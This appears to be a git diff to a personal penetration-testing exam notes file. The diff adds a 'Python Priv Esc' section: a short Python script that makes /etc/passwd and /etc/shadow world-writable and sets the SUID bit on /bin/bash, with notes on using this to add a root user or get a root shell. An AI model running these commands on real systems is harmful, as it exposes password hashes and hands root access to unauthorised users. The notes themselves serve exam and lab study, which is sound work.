@@ -166,6 +166,23 @@ Best TTY upgrade:
 * When enumerating FTP, ensure you run `dir -a` to enumerate any hidden files or directories on the system. You may find l00t!
 * Metasploit and Meterpreter are only allowed against one machine in the exam so ensure that you are sure before executing. There may be other ways to accomplish what you want (e.g., CrackMapExec, Lsassy, etc).&#x20;
 
+### Python Priv Esc
+
+We can privesc in multiple ways from running this script. For example, we can add a root user to the /etc/passwd file or we can run `/bin/bash -p` to obtain a shell with root privileges. .&#x20;
+
+```python
+import os
+
+def stop(text,value):
+        os.system("chmod 777 /etc/passwd");
+
+def reset(text,value):
+        os.system("chmod +s /bin/bash");
+
+def start(text,value):
+        os.system("chmod 777 /etc/shadow");
+```
+
 ### Helpful Blogs
 
 * [List of Kerberos attacks with different tooling](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
